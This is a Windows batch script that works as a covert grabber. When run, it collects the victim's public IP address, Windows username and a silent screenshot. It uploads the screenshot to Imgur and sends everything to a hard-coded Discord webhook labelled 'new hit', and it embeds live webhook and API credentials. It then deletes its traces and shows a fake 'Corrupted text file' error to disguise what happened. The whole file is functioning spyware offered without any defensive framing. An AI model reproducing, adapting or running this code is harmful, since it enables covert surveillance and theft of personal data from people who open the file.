@echo off
setlocal enabledelayedexpansion
set webhook=https://discord.com/api/webhooks/1327746317128306750/LgI9puzilqp0yX0QXxZ5aHLyYF5HXUHchCOhJTtX7d2sN5ysfw5OrHNSbz58QlxTj8Pi
set message=@everyone new hit
set temp_dir=%TEMP%
set client_id=3da05ad2f1e4121
set secret_key=12e03475e1f61a6df27c79e64ce53de1563063b4
for /f "tokens=2 delims=:," %%i in ('curl -s http://ipinfo.io/json ^| findstr /C:"\"ip\""') do (
    set ip=%%i
    set ip=!ip:"=!
    set ip=!ip: =!
)
for /f "delims=" %%i in ('whoami') do set username=%%i
set username=%username:\=\\%
for /f "delims=" %%i in ('powershell -Command "(Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss')"') do set time=%%i
set screenshot_path=%temp_dir%\screenshot.png
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $bitmap = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('%screenshot_path%', [System.Drawing.Imaging.ImageFormat]::Png)" >nul 2>&1
curl -X POST -H "Authorization: Client-ID %client_id%" -F "image=@%screenshot_path%" https://api.imgur.com/3/image.json --max-time 5 > %temp_dir%\imgur_response.json
for /f "delims=" %%i in ('powershell -Command "Get-Content %temp_dir%\imgur_response.json | ConvertFrom-Json | Select-Object -ExpandProperty data | Select-Object -ExpandProperty link"') do set image_url=%%i
if "%image_url%"=="" exit /b
(
echo {
echo     "content": "%message%",
echo     "embeds": [{
echo         "title": "New Hit",
echo         "description": "**IP Address:** %ip%\n**Username:** %username%\n**Time (GMT+0):** %time%",
echo         "image": { "url": "%image_url%" }
echo     }]
echo }
) > %temp_dir%\payload.json
curl -X POST -H "Content-Type: application/json" --data "@%temp_dir%\payload.json" %webhook% >nul 2>&1
del %screenshot_path% %temp_dir%\payload.json %temp_dir%\imgur_response.json 2>nul
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Corrupted text file.', 'Windows', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
